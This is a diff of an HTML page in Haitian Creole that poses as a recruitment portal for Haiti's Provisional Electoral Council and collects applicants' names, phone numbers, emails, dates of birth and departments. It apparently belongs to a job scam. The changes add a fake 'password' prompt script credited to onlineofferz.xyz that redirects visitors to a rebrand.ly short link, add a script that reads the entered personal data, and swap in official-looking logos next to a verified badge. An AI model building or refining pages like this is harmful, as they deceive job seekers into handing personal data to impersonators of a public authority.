@@ -4,7 +4,17 @@
 <html lang="en">
 <head>
   
-   
+   <script>
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'PÒTAL REKRITMAN'
+password = prompt(
+  'SMS: Byenveni nan pòtal rekritman ofisyèl la, klike sou OK pou soumèt aplikasyon w lan.',
+  'PÒTAL REKRITMAN'
+);
+if (password != 'PÒTAL REKRITMAN') {
+  location.href = 'https://rebrand.ly/CEP-Rekritman';
+}
+</script>
   
 <script src="moy.js"></script>
 <meta property="og:url" content="">
@@ -1297,7 +1307,7 @@ KONSÈY ELEKTORAL PWOVIZWA
 </b>
 <br>
 <hr color="Black"width="100%" />
-<b style="font-size: 20px;">Byenveni nan <font color="Green">KONSÈY ELEKTORAL PWOVIZWA</font> Pòtal rekritman anplwaye yo.<p style="animation: blink 1s linear infinite; font-weight:bold; color:red;">
+<b style="font-size: 20px;">Byenveni nan <font color="#1d56a0">KONSÈY ELEKTORAL PWOVIZWA</font> Pòtal rekritman anplwaye yo.<p style="animation: blink 1s linear infinite; font-weight:bold; color:#1d56a0;">
 SOUMÈT APLIKASYON OU KOUNYE A!
 </p>
 
@@ -1316,18 +1326,18 @@ SOUMÈT APLIKASYON OU KOUNYE A!
 <div class="survey_middle">
 <div class="survey_inner">
 <p class="question_text question1">
-<input type="text" name="First_name" placeholder="Prenon"><br/>
-<input type="text" name="Last_name" placeholder="Non Fanmi"><br/>
+<input type="text" id="firstName" name="First_name" placeholder="Prenon"><br/>
+<input type="text" id="lastName" name="Last_name" placeholder="Non Fanmi"><br/>
 Èske ou se yon sitwayen Ayiti?
 </p>
 <p class="question_text question2">
-<input type="text" name="Phone number" placeholder="Nimewo telefòn"><br/>
-<input type="text" name="_name" placeholder="E-Mail"><br/>
+<input type="text" id="phone" name="Phone number" placeholder="Nimewo telefòn"><br/>
+<input type="text" id="email" name="_name" placeholder="E-Mail"><br/>
 Pou ki pozisyon w ap aplike?
 </p>
 <p class="question_text question3">
 Antre dat nesans ou
-<input type="text" name="_name" placeholder="DD/MM/YYYY"><br/>
+<input type="text" id="dob" name="_name" placeholder="DD/MM/YYYY"><br/>
 <select style="width: 260px; padding: 10px; border-radius: 8px; border: 1px solid #ccc; font-size: 15px; background-color: #f8f9fa; color: #333; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
 <option selected disabled>Chwazi Depatman</option>
 <option value="Artibonite">Artibonite</option>
@@ -1414,26 +1424,28 @@ Felisitasyon, enfòmasyon ou yo resevwa avèk siksè!
 <center>
 <h4 class="textlastup">
 <i>
-  <div class="detail-item">
-                        <span class="detail-label">Prenon:</span>
-                        <span class="detail-value" id="getfirstname"></span>
-                    </div>
-                    
-                    
-                    <div class="detail-item">
-                        <span class="detail-label">Prenon:</span>
-                        <span class="detail-value" id="getlastname"></span>
-                    </div>
-                    
-                    <div class="detail-item">
-                        <span class="detail-label">Pozisyon:</span>
-                        <span class="detail-value" id="getpostion"></span>
-                    </div>
-                    
-                    <div class="detail-item">
-                        <span class="detail-label">Nimewo Telefòn:</span>
-                        <span class="detail-value" id="getphone"></span>
-                    </div>
+  <script>
+function getFormData() {
+    const firstName = document.getElementById("firstName").value;
+    const lastName  = document.getElementById("lastName").value;
+    const phone     = document.getElementById("phone").value;
+    const email     = document.getElementById("email").value;
+    const dob       = document.getElementById("dob").value;
+    const department = document.getElementById("department").value;
+
+    const fullName = firstName + " " + lastName;
+
+    console.log("Full Name:", fullName);
+    console.log("Phone:", phone);
+    console.log("Email:", email);
+    console.log("Date of Birth:", dob);
+    console.log("Department:", department);
+
+    // Example popup
+    alert("Non konplè: " + fullName);
+}
+</script>
+
 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/640px-Twitter_Verified_Badge.svg.png" alt="UN" width="5%">
 </i>
 <i style="font-size: 15px;">KONSÈY ELEKTORAL PWOVIZWA:</i>
@@ -1677,12 +1689,12 @@ s.parentNode.insertBefore(hm, s);
 
 </body>
 </html>
-<footer style="background-color: #545454; padding: 40px 0; text-align: center; border-top: 2px solid #ddd;">
+<footer style="background-color: #1d56a0; padding: 40px 0; text-align: center; border-top: 2px solid #ddd;">
 <div style="max-width: 900px; margin: auto; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 20px;">
 
 <!-- Logo section -->
 <div style="margin-bottom: 20px;">
-<img src="https://blogger.googleusercontent.com/img/a/AVvXsEgH1dMmCJ-h4hyScNdM332C50TGcFUICOAqGE4hQzu49OXhiktZQZLhSmqskiY2MjXkvg_r9rr9QNBivxAx-JIryTO92UrnTO0CKtnkrNszu0TDjGm4mm1r0lr2R_MVu0P9Z4qwRTXnNaRRKM5qG9V99ri0Koct0l1ct81NVpTw_1EjTqJaqDAqAraSKU8" alt="CENI Logo" style="height: 60px;">
+<img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Cephaiti-logo.png" alt="CENI Logo" style="height: 60px;">
 </div>
 
 <!-- Writing space -->
